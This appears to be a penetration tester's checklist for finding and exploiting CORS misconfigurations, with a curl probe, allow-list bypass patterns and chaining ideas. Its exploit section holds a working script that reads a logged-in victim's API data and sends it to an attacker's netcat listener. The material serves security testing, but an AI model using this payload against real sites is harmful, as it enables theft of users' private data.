# CORS misconfiguration

## Before I start
- [ ] An API that keeps its session in a cookie, with something worth reading from another origin

## Test
THE-COOKIE is my own session cookie:
curl -sk -I <Scheme>://<WebHost>/api/me -H 'Origin: https://evil.example' -H 'Cookie: THE-COOKIE'
- [ ] Access-Control-Allow-Origin gives my origin back, with Access-Control-Allow-Credentials: true: exploitable
- [ ] Access-Control-Allow-Origin: null: the same, from a sandboxed iframe
- [ ] Access-Control-Allow-Origin: * with credentials: browsers refuse it, so the reflected origin is the case to find
- [ ] An allow list matched by pattern, with trusted.example the allowed name: trusted.example.evil.example, eviltrusted.example and trusted.example@evil.example

## Exploit
A listener on Kali, and this on a page of my own:
rlwrap nc -lvnp <LPORT>
<script>
fetch('<Scheme>://<WebHost>/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://<LHOST>:<LPORT>/?d='+btoa(d)))
</script>
- [ ] A logged-in user who opens my page sends their data to my listener

## Chains
- [ ] A subdomain takeover of an allowed origin: the page served from the trusted name
- [ ] XSS on any allowed subdomain: the whole API read through it, :Pb xss
- [ ] Credentials not allowed: still useful against an intranet application that trusts by IP address

## If it fails
- [ ] A fixed allow list, with no reflection and no null: nothing here
- [ ] Only public data readable: too little to report

## Next
- [ ] Tokens or personal data read: what the account can do, :Pb api
- [ ] Redirect chains across origins: :Pb oauth
